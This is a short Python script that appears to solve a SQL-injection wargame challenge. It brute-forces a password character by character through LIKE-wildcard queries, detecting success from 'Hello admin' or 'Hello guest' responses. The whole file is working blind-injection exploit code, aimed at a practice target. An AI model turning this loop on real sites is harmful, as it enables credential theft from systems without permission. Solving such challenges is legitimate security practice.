import requests
import string

header = {"Cookie": "PHPSESSID=;"}
url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
string_data = string.digits + string.ascii_letters

print(string_data)

pw = ""
guest_pw = ""

# find pw length
while True:
    for i in string_data:
        data = "?pw={}%".format(guest_pw+i)
        response = requests.get(url + data, headers=header)
        if response.text.find("Hello admin") != -1:
            print("[+] Hello admin : " + str(guest_pw+i) + "%")
            exit()
        if response.text.find("Hello guest") != -1:
            print("[+] Hello guest : " + str(guest_pw+i) + "%")
            guest_pw += i